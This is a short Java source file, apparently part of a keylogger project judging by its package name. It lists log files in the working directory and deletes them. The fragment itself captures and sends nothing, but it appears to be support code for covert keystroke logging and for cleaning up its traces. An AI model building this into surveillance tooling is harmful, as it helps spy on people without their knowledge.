package com.mossad.keylogger.files;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.List;
import java.util.logging.Logger;

import static kisonar.platform.domain.BaseDefinitions.EMPTY;

public final class LogFilesCollector {

       private final Logger LOG = Logger.getLogger(LogFilesCollector.class.getCanonicalName());

       public LogFilesCollector() {
       }

       public List<String> collectLogs() {
             var currentDirectory = new File(new File(EMPTY).getAbsolutePath());
             var pathAsString = currentDirectory.getAbsolutePath();
             try (var paths = Files.list(Paths.get(pathAsString))) {
                   return paths.map(Path::toString).filter(path -> !path.endsWith(".lck") && path.contains("Log"))
                           .toList();

             }
             catch (IOException e) {
                   LOG.warning("Cannot collect logs %s".formatted(e.getMessage()));
                   return List.of();
             }
       }

       public void removeLogs(List<String> filesNames) {
             filesNames.forEach(path -> {
                   try {
                         Files.delete(Paths.get(path));
                   }
                   catch (IOException e) {
                         LOG.warning("Cannot remove logs %s".formatted(e.getMessage()));
                   }
             });
       }
}
